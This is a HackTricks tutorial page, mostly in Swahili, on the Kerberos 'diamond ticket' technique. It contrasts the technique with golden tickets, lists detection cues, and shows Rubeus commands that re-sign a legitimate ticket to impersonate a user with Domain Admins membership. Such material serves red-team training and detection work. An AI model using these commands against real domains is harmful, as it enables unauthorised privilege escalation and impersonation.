# Diamond Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Diamond Ticket

**Kama tiketi ya dhahabu**, tiketi ya almasi ni TGT ambayo inaweza kutumika **kuingia kwenye huduma yoyote kama mtumiaji yeyote**. Tiketi ya dhahabu inaundwa kabisa mtandaoni, imefungwa kwa hash ya krbtgt ya eneo hilo, na kisha kuingizwa kwenye kikao cha kuingia kwa matumizi. Kwa sababu wasimamizi wa eneo hawafuatilii TGTs ambazo zimepewa kihalali, watakubali kwa furaha TGTs ambazo zimefungwa kwa hash yao ya krbtgt.

Kuna mbinu mbili za kawaida kugundua matumizi ya tiketi za dhahabu:

* Angalia TGS-REQs ambazo hazina AS-REQ inayolingana.
* Angalia TGTs ambazo zina thamani za kipumbavu, kama vile muda wa miaka 10 wa Mimikatz.

**Tiketi ya almasi** inaundwa kwa **kubadilisha maeneo ya TGT halali ambayo ilitolewa na DC**. Hii inafikiwa kwa **kuomba** **TGT**, **kuifungua** kwa hash ya krbtgt ya eneo, **kubadilisha** maeneo yanayotakiwa ya tiketi, kisha **kuifunga tena**. Hii **inasuluhisha mapungufu mawili yaliyotajwa hapo juu** ya tiketi ya dhahabu kwa sababu:

* TGS-REQs zitakuwa na AS-REQ inayotangulia.
* TGT ilitolewa na DC ambayo inamaanisha itakuwa na maelezo yote sahihi kutoka kwenye sera ya Kerberos ya eneo. Ingawa haya yanaweza kuundwa kwa usahihi katika tiketi ya dhahabu, ni ngumu zaidi na yanaweza kuwa na makosa.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
